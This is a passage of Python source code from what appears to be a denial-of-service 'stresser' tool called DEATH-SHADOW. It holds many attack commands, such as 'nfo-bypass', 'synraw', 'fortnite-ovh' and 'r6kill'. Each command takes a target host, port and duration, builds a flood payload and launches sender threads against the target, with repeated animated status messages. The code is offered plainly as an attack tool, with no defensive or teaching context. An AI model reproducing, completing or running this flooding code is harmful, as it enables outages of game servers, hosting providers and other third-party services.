					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "nfo-bypass":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=stdsender, args=(host, port, timer, lunch, bots, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcp-raw":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x55\x55\x55\x55\x00\x00\x00\x01"
					threading.Thread(target=stdsender, args=(host, port, timer, lunch, bots, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "hex-raw":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x55\x55\x55\x55\x00\x00\x00\x01"
					threading.Thread(target=stdsender, args=(host, port, timer, lunch, bots, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "stdraw":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x1e\x00\x01\x30\x02\xfd\xa8\xe3\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, lunch, bots, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "vseraw":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x01\x01\x00\x01\x55\x03\x6f\x03\x1c\x03\x00\x00\x14\x14"
					threading.Thread(target=stdsender, args=(host, port, timer, lunch, bots, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "synraw":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x01\x01\x00\x01\x55\x03\x6f\x03\x1c\x03\x00\x00\x14\x14"
					threading.Thread(target=stdsender, args=(host, port, timer, lunch, bots, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "fortnite-down":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=randsender, args=(host, timer, port, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "fortnite-kill":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=randsender, args=(host, timer, port, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "fortnitev2":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=randsender, args=(host, timer, port, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "fortnite-rape":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=randsender, args=(host, timer, port, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "fortnite-bypass":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=randsender, args=(host, timer, port, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "fortnite-slump":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=randsender, args=(host, timer, port, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "fortnitev1":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=randsender, args=(host, timer, port, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "fortnite-stresser":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=randsender, args=(host, timer, port, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "fortnite-sas":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=randsender, args=(host, timer, port, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "fortnite-ovh":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=randsender, args=(host, timer, port, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "fortnite-tcp":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=randsender, args=(host, timer, port, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "fortnite-udp":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=randsender, args=(host, timer, port, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "r6kill":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
